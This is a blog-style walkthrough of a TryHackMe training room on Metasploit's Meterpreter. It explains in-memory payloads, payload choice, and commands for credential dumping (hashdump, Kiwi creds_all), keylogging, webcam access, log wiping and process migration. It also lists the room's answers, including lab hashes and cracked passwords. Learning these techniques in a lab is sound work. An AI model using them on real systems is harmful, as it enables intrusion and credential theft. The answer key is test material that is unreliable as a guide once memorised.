---
title: "Metasploit: Meterpreter — TryHackMe Cyber Security 101"
date: 2026-05-01
category: "writeup"
excerpt: "Walkthrough of TryHackMe's Metasploit: Meterpreter room — Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation."
image: "/images/blog/104.png"
readtime: "28 min read"
draft: false
---

## Tasks

- [Task 1 — Introduction to Meterpreter](#task-1)
- [Task 2 — Meterpreter Flavors](#task-2)
- [Task 3 — Meterpreter Commands](#task-3)
- [Task 4 — Post-Exploitation with Meterpreter](#task-4)
- [Task 5 — Post-Exploitation Challenge](#task-5)

---

## Task 1 — Introduction to Meterpreter {#task-1}

So we're finally here. If the last two rooms were about getting Metasploit set up and then actually exploiting things, this one is about what happens after you're in. And the thing that makes that possible is Meterpreter.

Meterpreter is a Metasploit payload. Once it runs on the target it acts as an agent you can talk to and give instructions. Think of it like a remote control for the machine you just got into.

**How it actually works (and why it's sneaky)**

Here's the thing about Meterpreter that makes it interesting from a stealth perspective: it doesn't write itself to disk. It runs entirely in memory, in RAM. No `meterpreter.exe` sitting in some folder. No file for antivirus to trip over when it's scanning new files on the system.

When you get a Meterpreter session going, it shows up as a process with some PID. In the room's example it's running as PID 1304. But if you run `ps` inside Meterpreter to list all running processes, PID 1304 shows up as `spoolsv.exe`, which is the Windows print spooler. Not Meterpreter.



```bash
meterpreter > getpid
Current pid: 1304
```

And if you go even further and look at what DLLs that process is loading with `tasklist /m /fi "pid eq 1304"`, you get a completely normal looking list of Windows DLLs. No `meterpreter.dll`. Nothing that would make you go "oh that's definitely a hacker."

The other thing it does is encrypt its traffic. Meterpreter communicates back to your attacking machine over TLS, the same encryption used by HTTPS. So if the target network has IDS or IPS solutions watching traffic, they'll just see encrypted communication going in and out and (assuming they're not doing SSL inspection) have nothing to flag.

Now, full honesty here: major antivirus software does detect Meterpreter. This isn't some magic invisibility cloak. But the memory-only and encrypted comms approach means it's doing the best it can to stay quiet, and in a lot of environments it works well enough.

---

## Task 2 — Meterpreter Flavors {#task-2}

Meterpreter isn't one thing. There's a whole bunch of versions for different platforms and situations.

Quick recap from the previous rooms: Metasploit payloads are either staged or inline (stageless). Staged means the initial bit that lands on the target goes and fetches the rest of the payload in a second step. Inline means the whole thing is sent at once. Meterpreter comes in both types.

To see everything available you can run:

```bash
msfvenom --list payloads | grep meterpreter
```

The list is long. Meterpreter exists for:

- Android
- Apple iOS
- Java
- Linux
- OSX
- PHP
- Python
- Windows

How do you pick which one? Three main things to think about:

First, what OS is the target running? A Linux box needs a Linux Meterpreter. A Windows box needs a Windows one. Sending the wrong one just won't work.

Second, what's available on the target? If you're going through a PHP web application vulnerability, a PHP Meterpreter makes sense. If Python is installed on the system, the Python version is an option.

Third, what kind of connection can you actually make? Can you get a raw TCP connection back to yourself? Do you need to go over HTTPS to blend in with normal web traffic? Is IPv6 less monitored than IPv4 on that network? These questions affect which payload you pick.

If you're using an exploit module rather than a standalone payload from msfvenom, you might not have a full choice. Some exploits default to a specific Meterpreter version. The EternalBlue exploit for example defaults to `windows/x64/meterpreter/reverse_tcp` when you select it:

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

You can still change it with `show payloads` to see what else is compatible, and then `set payload` to switch. But the point is: the exploit itself sometimes limits your options.

---

## Task 3 — Meterpreter Commands {#task-3}

Once you have a Meterpreter session open (you'll see `meterpreter >` at the prompt), the first thing to do is just run `help`. Every Meterpreter version is a bit different, so the help menu for a Windows Meterpreter won't be identical to a Linux one.

Commands are grouped by category. Here's a rundown of the important ones.

**Core commands** are for managing the session itself:

- `background` — send the session to the background so you're back at the Metasploit prompt (same as CTRL+Z)
- `exit` — close the session entirely
- `guid` — get the unique ID for this session
- `migrate` — move Meterpreter into a different process (more on this in the next task)
- `load` — load an extension to add more capabilities
- `sessions` — switch to a different open session
- `run` — run a post-exploitation module

**File system commands** let you poke around the target:

- `ls` / `dir` — list files in the current directory
- `cd` — change directory
- `pwd` — show where you currently are
- `cat` — print file contents to screen
- `search` — search for files by name or pattern
- `upload` — upload a file from your machine to the target
- `download` — pull a file from the target to your machine
- `edit` — open a file for editing
- `rm` — delete a file

**Networking commands** for understanding the network the target sits on:

- `ifconfig` — show network interfaces on the target
- `arp` — show the ARP cache (gives you clues about other machines on the same network)
- `netstat` — show active connections
- `portfwd` — forward a port from the target to your machine
- `route` — view and modify routing

**System commands** for interacting with the OS:

- `getuid` — show which user Meterpreter is running as
- `getpid` — show the current process ID
- `ps` — list all running processes
- `sysinfo` — get OS and machine name info
- `shell` — drop into a real command shell on the target
- `execute` — run a command on the target
- `kill` / `pkill` — kill a process by PID or name
- `clearev` — wipe the Windows event logs
- `reboot` / `shutdown` — do exactly what they say
- `getsystem` — attempt to escalate to SYSTEM privileges

**The more interesting ones** scattered across different categories:

- `hashdump` — dump password hashes from the SAM database
- `keyscan_start` / `keyscan_stop` / `keyscan_dump` — keylogger functionality
- `screenshot` — take a screenshot of the desktop
- `screenshare` — watch the desktop in real time
- `webcam_snap` / `webcam_stream` — interact with the webcam if one exists
- `record_mic` — record from the microphone
- `idletime` — check how long the user has been idle

Worth knowing: just because a command shows up in `help` doesn't mean it'll actually work. If the target is a headless server with no desktop it's not going to have a webcam. If it's a virtual machine the audio commands might do nothing. The list is what's possible in theory, reality depends on the target.

---

## Task 4 — Post-Exploitation with Meterpreter {#task-4}

Okay so you have a shell. Now what? This task goes through the commands you'll actually be using in post-exploitation, which is everything that happens after you're in.

**getuid**

First thing to run. It tells you who you are on the system:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

`NT AUTHORITY\SYSTEM` is as high as it gets on Windows. That's a great result. If you land as a lower-privileged user you'll probably want to try `getsystem` to escalate.

**ps and migrate**

`ps` lists all running processes with their PIDs, parent PIDs, names, architectures, and users. You use this to find a process to migrate into.

Why migrate? A few reasons. If the process your Meterpreter landed in is unstable or likely to get killed, moving into something more permanent like `explorer.exe` or `svchost.exe` gives you a more reliable session. Also, if you want to use the keylogger features you need to migrate into the process the user is actively typing into, like a word processor or browser.

```bash
meterpreter > migrate 716
[] Migrating from 1304 to 716...
[] Migration completed successfully.
```
One important warning though: if you migrate from a high-privilege process into a low-privilege one, you'll lose those privileges and probably won't get them back. So check what user owns the process before you migrate. Don't do something dumb like migrate from SYSTEM into a process running as a standard user because you weren't paying attention.

**hashdump**

This one dumps the contents of the SAM database, which is where Windows stores password hashes:

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

You get the username, user ID, and NTLM hash. You can't reverse these mathematically but you can look them up in online NTLM databases (crackstation.net is the go-to) or run them through a tool like hashcat or john. A lot of common passwords will crack instantly. You can also use these hashes directly in Pass-the-Hash attacks against other machines on the same network without ever knowing the plaintext.

**search**

Really useful for finding specific files without manually browsing through the whole filesystem:

```bash
meterpreter > search -f flag2.txt
Found 1 result...
c:\Windows\System32\config\flag2.txt (34 bytes)
```

In CTF rooms this finds the flag. In real engagements this finds things like configuration files, database credential files, backup files, or anything else you can name. You can also search by pattern, like `*.config` or `*.kdbx`.

**shell**

Sometimes you just need a proper Windows command prompt. `shell` drops you into one. When you're done, `CTRL+Z` sends you back to Meterpreter.

```bash
meterpreter > shell
Process 2124 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

---

## Task 5 — Post-Exploitation Challenge {#task-5}

This is the hands-on task. You're given credentials for an initial compromise over SMB using `exploit/windows/smb/psexec`:

- Username: `ballen`
- Password: `Password1`

Once you're in with a Meterpreter session, you can load Kiwi (which is a Meterpreter port of Mimikatz) to go after credentials:

```bash
meterpreter > load kiwi
```

Loading Kiwi adds a bunch of new commands to your help menu. The one you'll want for grabbing all credentials at once is `creds_all`. This pulls NTLM hashes, Kerberos tickets, and anything else it can find.

For locating files, `search -f secrets.txt` and `search -f realsecret.txt` will find them without you having to wander around the filesystem guessing.

The NTLM hash you get for jchambers can be looked up on crackstation.net and it cracks to a cleartext password immediately since it's a commonly used one.

**Question: What is the computer name?** `ACME-TEST`

You get this from `sysinfo`.

**Question: What is the target domain?** `FLASH`

**Question: What is the name of the share likely created by the user?** `speedster`

You find this by looking at SMB shares, either with `smb_enumshares` during scanning or by exploring the filesystem. The name stands out as user-created vs the default Windows shares.

**Question: What is the NTLM hash of the jchambers user?** `69596c7aa1e8daee17f8e78870e25a5c`

From `hashdump` or `creds_all` after loading Kiwi.

**Question: What is the cleartext password of the jchambers user?** `Trustno1`

Look that NTLM hash up and it cracks straight away. Classic password.

**Question: Where is the "secrets.txt" file located?** `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt`

`search -f secrets.txt` finds it.

**Question: What is the Twitter password in secrets.txt?** `KDSvbsw3849!`

`cat` the file once you find it.

**Question: Where is the "realsecret.txt" file located?** `c:\inetpub\wwwroot\realsecret.txt`

`search -f realsecret.txt`. It's sitting in the web server root which is a fun detail.

**Question: What is the real secret?** `The Flash is the fastest man alive`

---

That's the Meterpreter room done. It's a lot of commands to take in but honestly most of them are pretty logical once you've used them a couple of times. The ones that will come up again and again are `getuid`, `ps`, `migrate`, `hashdump`, `search`, and `shell`. The Kiwi/Mimikatz stuff is really powerful for going after credentials in a Windows environment.

The migrate command is probably the one worth practicing the most because the "migrate from high privilege to low privilege and lose everything" trap is exactly the kind of thing that bites you at 1am during a CTF when you're not thinking clearly.

Next up is the post-exploitation stuff outside of Metasploit. Things are going to get more manual from here.

On to the next one.

---